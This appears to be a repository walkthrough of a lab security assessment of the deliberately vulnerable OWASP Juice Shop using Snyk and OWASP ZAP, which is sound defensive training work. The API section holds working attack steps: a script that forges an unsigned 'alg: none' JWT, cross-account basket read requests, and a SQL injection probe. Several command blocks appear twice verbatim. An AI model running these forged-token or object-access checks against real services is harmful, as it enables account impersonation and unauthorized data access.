# My Project 2A SCA, SAST and DAST Scanning: Application and API Security Assessment Journey

- **Core technologies:** Ubuntu in WSL, a hardened Ubuntu admin node, a hardened Ubuntu target node, Docker, OWASP Juice Shop, Snyk Open Source, Snyk Code, and OWASP ZAP.
- **Problem addressed:** I needed to assess an intentionally vulnerable web application across its dependencies, source code, web behavior, and API authorization, then record findings for the teams responsible for remediation.
- **Outcome:** I completed SCA and SAST scans, used ZAP baseline and AJAX Spider scans for DAST, and assessed API security with ZAP API Scan plus targeted manual checks. I documented individual findings, triage, and remediation ownership in this repository. I did not modify Juice Shop or remediate the findings; the next action belongs to the development/service owners.

This walkthrough records how I carried out Project 2A SCA, SAST and DAST Scanning, what I learned from each assessment stage, the problems that interrupted the work, and how I restored a reliable test path. It follows the same practical, first-person style as the Project 01B walkthrough. Commands are examples from the lab sequence; credentials, private keys, and passwords are intentionally omitted.

## The lab scenario

Project 2A SCA, SAST and DAST Scanning continued the hardened lab environment established in Project 1A Linux Server Hardening. I reused the same three-node layout: my Windows workstation running Ubuntu in WSL, the admin node, and the target node. The servers retained the hardening and access controls from the earlier project. Project 2A SCA, SAST and DAST Scanning added an application-security assessment to that foundation; it did not repeat the server-hardening work.

The target server was the previously hardened Ubuntu target node. It hosted **OWASP Juice Shop**, a deliberately vulnerable web application built for security training, in a Docker container. Running the application in Docker kept its process and packages in a separate container environment, while the Project 1A Linux Server Hardening controls remained applied to the host. The container published its web port on the target's private lab interface, and I reached it through the lab network and SSH forwarding path. This maintained the lab's network isolation while giving me a realistic running target for web and API assessment. Juice Shop's vulnerabilities are intentional; I used them to demonstrate how to discover, validate, classify, and hand off findings.

The assessment covered four related but distinct areas:

1. **SCA — Software Composition Analysis:** identify known vulnerabilities in direct and transitive dependencies.
2. **SAST — Static Application Security Testing:** a **white-box** assessment because I had access to Juice Shop's source code. Snyk Code inspected source paths and code patterns without executing those paths in the running service. In this lab, that let me connect alerts to files and lines and review whether a pattern belonged to application code, tests, or an intentional training challenge.
3. **DAST — Dynamic Application Security Testing:** a **black-box** assessment of the running Juice Shop over HTTP using ZAP's baseline and AJAX Spider. I tested from the outside through the exposed web interface without giving those scans source-code access. In this lab, ZAP observed reachable pages, headers, and responses; it could not know the source intent or fully establish authenticated authorization behavior from the unauthenticated crawl.
4. **API Security:** an API-focused assessment of discovered routes, access control, token validation, input handling, and response behavior. I used ZAP API Scan for automated requests and separate, narrowly scoped manual checks for authenticated object-level authorization and token acceptance. The API scan is dynamic testing of API endpoints; it is presented separately here because the questions and evidence concern API-specific controls.

The purpose was to show the DevSecOps assessment and handoff process: collect evidence, explain impact and uncertainty, prioritize, and create actionable work for developers and service owners. I did not fix the source because the developers own application changes. DevSecOps helps teams interpret results, set verification expectations, and confirm a later fix.

### The three-node layout

| Node | Role in this project |
| --- | --- |
| WSL workstation | Snyk CLI work, ZAP control and reporting, curl/Python checks, and SSH tunnels to the lab. |
| Admin node | Management point used to inspect the target and verify reachability to the application. |
| Target node | Previously hardened Ubuntu host running the Juice Shop Docker container. |

The test path was deliberately kept within the lab network. I verified basic HTTP reachability before interpreting scanner output; an unavailable target produces timeouts or HTTP `000`, which says nothing about whether an endpoint is vulnerable.

### I checked the hardened target and Docker boundary

On the **target node**, I checked the private interface, running container, image tag, and published port:

```bash
ip -br -4 addr
sudo docker ps -a --filter name=juice-shop
sudo docker inspect juice-shop --format 'Image={{.Config.Image}} State={{.State.Status}} PortBindings={{json .HostConfig.PortBindings}}'
```

The target interface had a private lab address. The container inspection showed that the running Juice Shop instance used `bkimminich/juice-shop:latest` and published TCP 3000 only on that interface. I had attempted to transfer and start the `v20.3.0` image, but the run failed because a container named `juice-shop` already existed. I did not replace that running container. The final tests therefore targeted the existing `latest` image; the Docker tag was not a verified version pin.

The port binding exposed the container through the target's lab interface, not every host interface. Docker's separate network namespace helped isolate the application process, while the existing Linux hardening remained responsible for host access and network controls. A container by itself does not replace host hardening or firewall rules.

During troubleshooting, I inspected the host firewall and Docker forwarding rules on the **target node**:

```bash
sudo ufw status verbose
sudo iptables -t nat -S DOCKER
sudo iptables -S FORWARD
sudo iptables -S DOCKER
sudo iptables -L DOCKER-USER -n -v
```

UFW was inactive, and Docker had DNAT/forwarding rules for TCP 3000. Those checks explained how traffic was being forwarded, but they did not prove the full path from WSL to the application. I used an HTTP request from WSL as the end-to-end check below.

| Stage | Sequence |
| --- | --- |
| [1. Prepare the code and tools](#1-prepare-the-code-and-tools) | Locate the project → check Node/npm → install dependencies → confirm the Snyk CLI. |
| [2. SCA](#2-sca--software-composition-analysis) | Scan dependencies → interpret advisory/path output → preserve individual findings. |
| [3. SAST](#3-sast--static-application-security-testing) | Scan source → separate application code from tests/challenge examples → record findings. |
| [4. DAST](#4-dast--dynamic-application-security-testing) | Restore target reachability → baseline crawl → AJAX Spider → interpret scan limits. |
| [5. API Security](#5-api-security) | Run ZAP API Scan → combine tool evidence with bounded two-account, token, and response checks. |
| [6. Assessment handoff](#6-assessment-handoff) | Consolidate findings → triage → create developer issues → leave remediation to owners. |

**Starting point:** The servers had been hardened in Project 1A Linux Server Hardening and the Juice Shop source checkout was available in WSL. I used the lab accounts and SSH access already established for this environment. I did not include private key material or account passwords in this repository.

## 1. Prepare the code and tools

### 1.1 I checked the source checkout before running Snyk

SCA and SAST need the correct project directory. I changed into the Juice Shop checkout and checked which files were present:

```bash
cd ~/project-2a/juice-shop-source
pwd
ls -l package.json package-lock.json
```

The checkout had `package.json`, but no `package-lock.json`. That mattered because dependency scans should use the dependency tree resolved for the project, and a lockfile makes the exact versions reproducible. The checkout also initially had no `node_modules` directory.

### 1.2 I fixed missing Node.js and npm in WSL

My first version check failed with `node: command not found` and `npm: command not found`. This was a local WSL tool prerequisite, not a Juice Shop or Snyk finding. I installed Node.js and npm using the package manager available in the lab environment, then checked the versions:

```bash
sudo apt update
sudo apt install nodejs npm
node --version
npm --version
```

After installation I returned to the project directory. I installed the project dependencies so Snyk Test had a dependency tree to inspect:

```bash
cd ~/project-2a/juice-shop-source
npm install
```

**Problem I encountered:** The first `snyk test` returned `Missing node_modules folder: We can't test without dependencies. Please run 'npm install' first.` The fix was to install the dependencies in the project checkout before repeating the scan. Later, the API setup also showed why checking the manifest and lockfile matters: without a checked-in lockfile, the locally resolved tree is not a fully reproducible record of the application's original dependency versions.

### 1.3 I checked Snyk CLI access

The Snyk CLI had been installed under my WSL account's local binary directory. I invoked that executable directly rather than assuming it was on every user's `PATH`:

```bash
"$HOME/.local/bin/snyk" --version
```

Snyk authentication was configured for the lab account. Authentication tokens and other credentials are not part of the walkthrough or repository.

**Checkpoint:** The source checkout was present, Node.js/npm worked for the WSL user, dependencies were installed, and the Snyk CLI could start. I could now run SCA and SAST against the code while separately bringing up the application for DAST.

## 2. SCA — Software Composition Analysis

### 2.1 I scanned the resolved dependency tree

SCA checks packages declared or resolved by the project against known vulnerability advisories. It can identify a vulnerable library, but a package's severity alone does not prove that the vulnerable code is reachable in the deployed application. The assessment captured the Snyk Open Source output after dependencies had been installed:

```bash
"$HOME/.local/bin/snyk" test --dev
```

The `--dev` option included development dependencies. This widened coverage to build and test packages, so I needed to retain each dependency path and later distinguish likely runtime packages from tooling. Snyk reported **87 advisory/path entries**, including **2 Critical** and **36 High** entries. The full individual records are in [sca-individual-findings.md](sca-individual-findings.md); the corresponding SCA/SAST triage rows are in [risk-register-sca-sast.csv](risk-register-sca-sast.csv).

### 2.2 I treated dependency paths as part of the evidence

Two Critical entries stood out for follow-up:

- `marsdb@0.6.11`, reported with an arbitrary code injection advisory and shown as a direct introduced dependency.
- `decompress@4.2.1`, reported with a directory traversal advisory through `download@8.0.0`.

The output also contained High findings in legacy JWT packages, lodash, and other transitive/build-related chains. I preserved the package, advisory, severity, and dependency path rather than collapsing different paths into one count. A developer or service owner would next establish whether each dependency is shipped, imported, reachable, and covered by a supported upgrade.

**Problem and lesson:** The source checkout had no lockfile. Although `npm install` created a local dependency tree that Snyk could scan, this did not prove that the result exactly represented a previous build or the image running on the target. I recorded that limitation and kept dependency/runtime validation as a triage action instead of presenting the scan as an image SBOM.

**Checkpoint:** SCA identified vulnerable package versions and dependency chains. It did not establish exploitability in the running app or complete remediation. Those require application/build context and a later rescan.

## 3. SAST — Static Application Security Testing

### 3.1 I scanned first-party source separately

SAST is white-box here: I could inspect the application's source code and let Snyk Code analyze it without sending requests to the running Juice Shop instance. That gave me file-path context which a black-box web scan does not have. I used Snyk Code on the project checkout:

```bash
"$HOME/.local/bin/snyk" code test
```

The supplied Snyk Code output contained **306 individual records**. The findings included **26 High** records and **240 Low** records in `test/` paths, plus other Medium/Low records. I preserved each individual record in [sast-individual-findings.md](sast-individual-findings.md) with the finding ID, title, severity, and path so reviewers can inspect the source context.

### 3.2 I separated application paths from test fixtures and challenges

The path is important evidence. The 26 High records were in application-source paths; 23 were in route, frontend, or library paths, and three were under `data/static/codefixes/`, which may be training examples. There were no High records under `test/` in the supplied results. Many Low records were in tests and should not automatically become production application tickets unless the test material is shipped or contains a real secret.

Juice Shop intentionally includes vulnerable implementations to support training. That context does not make a scanner alert false by itself: the result still needs source review, challenge context, and an understanding of what is built and deployed. The triage file marks uncertain items as candidates pending that review.

I also reviewed high-priority source locations to see whether findings were in application code, tests, or challenge material. `rg` was not installed in my WSL environment, so these standard tools provide the equivalent source lookup when repeating the review:

```bash
cd ~/project-2a/juice-shop-source
grep -n -C 5 'criteria\|literal\|query' routes/search.ts
sed -n '1,140p' routes/search.ts
grep -RIn --include='*.ts' 'req\.query\|sequelize\.literal' routes lib
```

The source review found that `routes/search.ts` builds a SQL expression using the product-search query value. This helped connect the ZAP SQL alert to the source. Reading the code confirmed unsafe construction; it did not demonstrate data extraction or prove that every related scanner alert was exploitable.

**Checkpoint:** SAST supplied code locations and risky patterns for developer review because this was a white-box scan with source access. No application source was changed during this assessment, and scanner output was not treated as proof that every record is exploitable in production.

## 4. DAST — Dynamic Application Security Testing

### 4.1 I restored a testable path to Juice Shop

DAST needed a running target. During setup, requests repeatedly returned timeouts or HTTP `000`. I initially focused on the local SSH forwarding port, but a listening SSH process only proved that a local socket existed; it did not prove that the remote target was answering.

The first attempt from the target to pull the image failed because DNS could not resolve Docker Hub. I saved the image from WSL and copied it to the target:

```bash
# WSL workstation
# Replace these placeholders with the lab's assigned addresses.
TARGET_IP='<TARGET_LAB_PRIVATE_IP>'
ADMIN_IP='<ADMIN_NODE_IP>'
ADMIN_USER='mdsadmin'
docker save -o ~/project-2a/juice-shop-v20.3.0.tar bkimminich/juice-shop:v20.3.0
scp -i ~/.ssh/mds_admin_ed25519 \
  ~/project-2a/juice-shop-v20.3.0.tar \
  "$ADMIN_USER@$ADMIN_IP:/tmp/juice-shop-v20.3.0.tar"
```

An initial load/run attempt showed `docker: command not found` in that shell, so those commands did not load or start a container. In a later session, Docker inspection was available and a run attempt reported that the container name was already in use. This is the Docker launch pattern I attempted, with the lab address represented by a placeholder:

```bash
# Target Docker host; replace the placeholder with the target's private lab address.
TARGET_IP='<TARGET_LAB_PRIVATE_IP>'
sudo docker run -d --name juice-shop \
  -p "$TARGET_IP:3000:3000" \
  bkimminich/juice-shop:v20.3.0
```

It did not create a new container because the name was already in use. I then checked the existing container instead of assuming the image transfer had replaced it:

```bash
# Target node
sudo docker ps -a --filter name=juice-shop
sudo docker inspect juice-shop --format 'Image={{.Config.Image}} State={{.State.Status}} PortBindings={{json .HostConfig.PortBindings}}'
```

That showed the existing `juice-shop` container was up from `bkimminich/juice-shop:latest` with TCP 3000 mapped to the target's private interface. A container-local request and a Docker-bridge request both returned HTTP 200, so I narrowed the remaining failure to the client-to-target path. This Node-based command is a repeatable way to check the HTTP listener inside the Node.js application container:

```bash
# Target node: check the app in its own network namespace
sudo docker exec juice-shop node -e "require('http').get('http://127.0.0.1:3000/', r => { console.log('HTTP', r.statusCode); r.resume() }).on('error', e => { console.error(e.message); process.exit(1) })"

# Target node: discover the container address and check through the Docker bridge
CONTAINER_IP="$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' juice-shop)"
curl -sS -o /dev/null -w 'Container-bridge HTTP %{http_code}\n' \
  --max-time 5 "http://$CONTAINER_IP:3000/"
```

The first SSH tunnel attempt could not bind local port 3000 because another SSH process already owned it. The existing forward accepted a local connection but timed out because its remote path was stale. I used a free local port, 3001, for the working tunnel. Run this in a dedicated **WSL terminal** and leave it open:

```bash
# Replace these placeholders with the lab's assigned addresses.
TARGET_IP='<TARGET_LAB_PRIVATE_IP>'
ADMIN_IP='<ADMIN_NODE_IP>'
ADMIN_USER='mdsadmin'
ssh -N -L 3001:"$TARGET_IP":3000 \
  -i ~/.ssh/mds_admin_ed25519 \
  "$ADMIN_USER@$ADMIN_IP"
```

In a second WSL terminal, I confirmed that the tunnel reached the app:

```bash
ss -ltnp 'sport = :3001'
curl -sS -o /dev/null -w 'HTTP %{http_code}\n' \
  --max-time 10 http://localhost:3001/
```

The curl returned HTTP 200. The `ss` listener check by itself was not enough; only the HTTP response confirmed end-to-end reachability. The earlier HTTP `000` and timeout results were network-path failures, not findings.

That HTTP 200 was the reachability checkpoint for the later scans.

### 4.2 I ran ZAP baseline and AJAX Spider scans

With the target reachable, I used OWASP ZAP in a black-box DAST assessment: the scanner interacted with the live web application over HTTP and evaluated the pages and responses it could reach, without reading the source code. The baseline run discovered 116 URLs and reported **0 FAIL alerts**, **3 warning types**, and **58 PASS checks**. The warning types included missing Content Security Policy, cross-domain configuration, and the informational modern-web-application classification.

An AJAX-enabled baseline discovered 35 URLs in that run. A separate direct Spider API crawl found 94 traditional Spider URLs and 91 AJAX Spider URLs. The AJAX crawl exposed API routes and client-loaded resources that the traditional crawl missed. These counts came from different runs/settings; I recorded them as crawl coverage rather than comparing them as vulnerability counts.

**Problem I encountered:** The first AJAX attempt timed out while the SSH tunnel was down. After restoring connectivity I ran the Spider API crawl separately. This helped distinguish a scan configuration/connectivity failure from an application response and prevented the timeout from being reported as a security issue.

The scan was black-box: ZAP evaluated externally visible behavior and did not inspect source code. The SAST stage supplied the complementary white-box view of code paths. For API-specific probing, I describe ZAP's API Scan with the API Security results in the next section.

**Checkpoint:** DAST discovered reachable pages and response-level behaviors from the outside. The report distinguishes observed responses from source-confirmed issues and scanner signals that still need endpoint-specific validation.

#### Reproduction commands

The exact ZAP CLI invocation and exported scan configuration from the original runs were not retained in the chat, so these are reproducible CLI equivalents, not a claim that these exact lines produced the recorded counts. The results and counts above came from the completed lab scans.

```bash
mkdir -p reports/zap
ZAP_TARGET='http://host.docker.internal:3001'

# Passive baseline crawl
docker run --rm -t \
  -v "$PWD/reports/zap:/zap/wrk/:rw" \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t "$ZAP_TARGET" -r zap-baseline.html

# Baseline crawl with the AJAX Spider enabled
docker run --rm -t \
  -v "$PWD/reports/zap:/zap/wrk/:rw" \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t "$ZAP_TARGET" -j -r zap-baseline-ajax.html
```

The ZAP container must resolve `host.docker.internal` to the WSL host and reach port 3001. If it cannot, I check scanner-to-target connectivity before treating the output as a scan result. The target remains the isolated lab instance.


## 5. API Security

API security used two complementary methods. ZAP API Scan provided repeatable route discovery and generated probes across the imported API surface. Manual checks answered targeted questions the unauthenticated scan could not answer, especially whether one signed-in user could access another user's object and whether an unsigned token was accepted. The manual checks were read-only where possible and used two lab test accounts.

### 5.1 I ran the ZAP API Scan and established the API surface

The AJAX Spider and API Scan surfaced routes including challenge and quantity endpoints, product search, languages, application version/configuration, and user-related routes. The API Scan imported 16 URLs and reported 53 total URLs, 108 PASS checks, 0 FAIL, and 7 warning types. Its report listed 37 endpoints, all using GET, and noted slow responses. It was unauthenticated and covered only the imported API surface plus scanner-generated requests.

For a repeatable CLI run, I need an OpenAPI definition containing the API routes to assess. The original import file was not retained in the project folder, so this is a command template for rerunning the scan after exporting or rebuilding that definition:

```bash
docker run --rm -t \
  -v "$PWD:/zap/wrk/:rw" \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-api-scan.py \
  -t /zap/wrk/juice-shop-api.yaml \
  -f openapi \
  -r /zap/wrk/reports/zap/api-scan.html
```

The imported definition and authentication configuration determine coverage. The recorded API Scan was unauthenticated, so it did not test the two-account authorization case below.


ZAP reported a SQL Injection alert on `GET /rest/products/search?q=q%27` with an HTTP 500 response. Source review independently found that `routes/search.ts` interpolated the query value into a SQL template string. I recorded unsafe SQL construction as a source-confirmed weakness, while making clear that the scanner's 500 was not proof of data extraction. The SQL injection route is also an intentional Juice Shop training challenge.

Other ZAP API observations included server-error responses, unexpected content types, missing CSP, wildcard CORS, timestamps, and a private IP value in configuration output. The available evidence did not establish sensitive stack-trace disclosure, authenticated cross-origin data access, or secret exposure. The API and DAST appendices preserve the counts and examples with their limits.

I then inspected selected responses and kept tool evidence separate from manual evidence. A route returning `200` is not automatically a vulnerability: the response data and intended access policy matter.

These read-only GET requests reproduce several of the manual response checks from WSL after the port-3001 tunnel is returning HTTP 200:

```bash
BASE='http://localhost:3001'
curl -sS -i --max-time 10 "$BASE/api/Quantitys/"
curl -sS -i --max-time 10 "$BASE/rest/admin/application-configuration"
curl -sS -i --max-time 10 "$BASE/rest/admin/application-version"
curl -sS -i --max-time 10 "$BASE/rest/languages"
curl -sS -i --max-time 10 "$BASE/rest/products/search?q=apple"
curl -sS -i --max-time 10 "$BASE/api/Users"
curl -sS -i --max-time 10 --get --data-urlencode 'name=Score Board' "$BASE/api/Challenges/"
curl -sS -D - -o /dev/null --max-time 10 \
  -H 'Origin: https://other-origin.example' "$BASE/api/Quantitys/"
```

I recorded HTTP status, selected response headers, and the body where available. I reviewed the application-configuration response for the disclosed IP/timestamp values and common secret-like property names; no secret was confirmed. `/api/Users` returned `401` anonymously. These requests do not change application state.

These read-only GET requests reproduce several of the manual response checks from WSL after the port-3001 tunnel is returning HTTP 200:

```bash
BASE='http://localhost:3001'
curl -sS -i --max-time 10 "$BASE/api/Quantitys/"
curl -sS -i --max-time 10 "$BASE/rest/admin/application-configuration"
curl -sS -i --max-time 10 "$BASE/rest/admin/application-version"
curl -sS -i --max-time 10 "$BASE/rest/languages"
curl -sS -i --max-time 10 "$BASE/rest/products/search?q=apple"
curl -sS -i --max-time 10 "$BASE/api/Users"
```

I recorded HTTP status, selected response headers, and the body where available. I reviewed the application-configuration response for the disclosed IP/timestamp values and common secret-like property names; no secret was confirmed. `/api/Users` returned `401` anonymously. These requests do not change application state.

For example, the public `/api/Quantitys/` endpoint returned 56 inventory records with exact quantities and per-user purchase limits. This was recorded as a potential business-data exposure for an owner to assess, because the evidence did not define whether the lab intended those values to be public. The anonymous `/api/Users` request returned `401`, which was positive evidence that anonymous access was denied on that route.

### 5.2 I tested cross-account basket authorization

The automated API scan was unauthenticated, so it could not establish cross-account object authorization. I used Account A and Account B, recorded each account's own basket ID, then issued read-only requests for the other account's basket. The output showed HTTP 200 in both directions and returned the other account's basket ID. This confirmed a lab Broken Object Level Authorization (BOLA) issue, recorded as **API-01** and linked to GitHub Issue #1.

The test demonstrated cross-account basket access. It did not inspect basket contents or attempt a state-changing operation, so the evidence is limited to the unauthorized object reference/read behavior observed.

To repeat the check, I first log in to each designated lab account and record its token and own basket ID. I enter the values at hidden prompts so they do not appear in terminal history:

```bash
BASE='http://localhost:3001'
read -r -p 'Account A basket ID: ' BASKET_A
read -r -p 'Account B basket ID: ' BASKET_B
read -r -s -p 'Account A JWT: ' TOKEN_A; echo
read -r -s -p 'Account B JWT: ' TOKEN_B; echo

# Control requests: each account reads its own basket
curl -sS -w '\nHTTP %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_A" "$BASE/rest/basket/$BASKET_A"
curl -sS -w '\nHTTP %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_B" "$BASE/rest/basket/$BASKET_B"

# Read-only authorization checks: request the other account's basket
curl -sS -w '\nHTTP %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_A" "$BASE/rest/basket/$BASKET_B"
curl -sS -w '\nHTTP %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_B" "$BASE/rest/basket/$BASKET_A"
```

The two cross-account requests returned HTTP 200 and the other account's basket ID. I used only the two designated lab accounts and read-only requests.

To repeat the check, I first log in to each designated lab account and record its token and own basket ID. I enter the values at hidden prompts so they do not appear in terminal history:

```bash
BASE='http://localhost:3001'
read -r -p 'Account A basket ID: ' BASKET_A
read -r -p 'Account B basket ID: ' BASKET_B
read -r -s -p 'Account A JWT: ' TOKEN_A; echo
read -r -s -p 'Account B JWT: ' TOKEN_B; echo

# Control requests: each account reads its own basket
curl -sS -w '\nHTTP %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_A" "$BASE/rest/basket/$BASKET_A"
curl -sS -w '\nHTTP %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_B" "$BASE/rest/basket/$BASKET_B"

# Read-only authorization checks: request the other account's basket
curl -sS -w '\nHTTP %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_A" "$BASE/rest/basket/$BASKET_B"
curl -sS -w '\nHTTP %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_B" "$BASE/rest/basket/$BASKET_A"
```

The two cross-account requests returned HTTP 200 and the other account's basket ID. I used only the two designated lab accounts and read-only requests.

### 5.3 I checked whether an unsigned JWT was accepted

I used a test account and sent a read-only basket request with an unsigned JWT (`alg: none`). The service returned HTTP 200 and a basket ID. This confirmed that the lab accepted an unsigned token for that protected read, recorded as **API-02** and linked to GitHub Issue #2. The broader consequences, such as using the token to impersonate other users or perform writes, were not tested.

This command illustrates the lab check. It takes a JWT from a designated test account, changes the header to `alg: none`, removes the signature, then sends a read-only basket request. The test token is supplied locally and must not be saved in the repository:

```bash
BASE='http://localhost:3001'
read -r -p 'Account A basket ID: ' BASKET_A
read -r -s -p 'Account A JWT: ' TOKEN_A; echo
export TOKEN_A
TOKEN_NONE="$(python3 - <<'PY'
import base64, json, os

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

parts = os.environ['TOKEN_A'].split('.')
if len(parts) != 3:
    raise SystemExit('Expected a three-part JWT')
header = b64url(json.dumps({'alg': 'none', 'typ': 'JWT'}, separators=(',', ':')).encode())
print(header + '.' + parts[1] + '.')
PY
)"
curl -sS -w '\nHTTP %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_NONE" \
  "$BASE/rest/basket/$BASKET_A"
unset TOKEN_A TOKEN_NONE
```

This is an intentionally negative authentication check against the isolated Juice Shop lab. The recorded result was HTTP 200; it did not modify data.

This command illustrates the lab check. It takes a JWT from a designated test account, changes the header to `alg: none`, removes the signature, then sends a read-only basket request. The test token is supplied locally and must not be saved in the repository:

```bash
BASE='http://localhost:3001'
read -r -p 'Account A basket ID: ' BASKET_A
read -r -s -p 'Account A JWT: ' TOKEN_A; echo
export TOKEN_A
TOKEN_NONE="$(python3 - <<'PY'
import base64, json, os

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

parts = os.environ['TOKEN_A'].split('.')
if len(parts) != 3:
    raise SystemExit('Expected a three-part JWT')
header = b64url(json.dumps({'alg': 'none', 'typ': 'JWT'}, separators=(',', ':')).encode())
print(header + '.' + parts[1] + '.')
PY
)"
curl -sS -w '\nHTTP %{http_code}\n' \
  -H "Authorization: Bearer $TOKEN_NONE" \
  "$BASE/rest/basket/$BASKET_A"
unset TOKEN_A TOKEN_NONE
```

This is an intentionally negative authentication check against the isolated Juice Shop lab. The recorded result was HTTP 200; it did not modify data.

**Safety and evidence note:** The purpose was to demonstrate authentication validation in the training app. I did not test real accounts or a production service, and I did not use the test to modify basket state.

### 5.4 I combined manual and tool results without treating them as duplicates

The two-account BOLA and unsigned-JWT checks were manual-only in the recorded assessment; ZAP's unauthenticated API scan did not reproduce them. The product-search SQL alert was tool-generated and then corroborated by source review. CORS and configuration findings had overlapping ZAP and manual evidence, but each method answered a different question. The manual check confirmed the observed header or response content; ZAP showed that similar behavior occurred across its scan surface.

The API appendix and consolidated assessment distinguish:

- **API-01:** confirmed cross-account basket read (manual, two accounts).
- **API-02:** unsigned JWT accepted on a protected basket read (manual).
- **API-03:** unsafe product-search SQL construction (ZAP signal plus source confirmation; runtime exploit effect not demonstrated).
- **API-04:** wildcard CORS policy observed; sensitive credentialed cross-origin access not demonstrated.
- **API-05:** configuration IP/timestamp metadata observed; no secret confirmed and sensitivity depends on owner context.
- **API-06:** malformed-request server errors observed by ZAP; no sensitive response body confirmed.
- **API-07/API-08:** content-type and CSP observations recorded as lower-confidence or lower-impact follow-up items.

## 6. Assessment handoff

### 6.1 I wrote findings for the teams who own remediation

My role in this lab was assessment and risk communication. The developers own source changes. The service owner supplies business context, assigns an accountable team, sets target dates, and decides whether any residual risk is accepted. DevSecOps makes the work actionable by preserving evidence, deduplicating results, explaining confidence, connecting findings to risk, and defining how a fix should be verified.

The repository contains the consolidated assessment report, SCA/SAST/DAST/API appendices, risk register, detailed SCA/SAST CSV, and first-pass triage. Six API remediation issues were created in GitHub Issues #1–#6. They link back to evidence and provide proposed acceptance and verification expectations. An issue is a handoff; it is not proof that a developer has fixed the problem.

### 6.2 I kept remediation and verification as future work

This lab stage stops after documenting and assigning follow-up. No Juice Shop source fixes were made. In a real delivery pipeline, the development team would implement changes, and DevSecOps would help define focused regression tests, rerun the relevant scanner or manual check against the fixed build, capture the result, and update the assessment and risk register. A service owner would close or accept the risk based on evidence and business context.

## What I learned

- A scan cannot begin until the right code, dependencies, target, and network path are available. `HTTP 000` and missing `node_modules` are setup failures, not security results.
- SCA needs dependency paths and build context; SAST needs source/path review; DAST needs a reachable running target; API authorization checks need authenticated identities and object-level test cases.
- Automation gives breadth and repeatability. Manual checks answer focused questions that an unauthenticated scanner cannot answer. Their evidence should be combined with provenance preserved.
- Juice Shop is deliberately vulnerable, so the lab shows how to assess and communicate issues rather than how to claim production risk without context.
- Finding a defect is one stage of DevSecOps. The process becomes useful when the evidence reaches the right engineering owner with a clear fix outcome and a way to verify it.

## Related Project 2A SCA, SAST and DAST Scanning records

- [Consolidated assessment report](assessment-report-inventory.md)
- [First-pass triage](triage-review.md)
- [Risk register](risk-register.md)
- [Detailed SCA/SAST register](risk-register-sca-sast.csv)
- [SCA individual findings](sca-individual-findings.md)
- [SAST individual findings](sast-individual-findings.md)
- [DAST individual findings](dast-individual-findings.md)
- [Manual API findings](manual-api-findings.md)
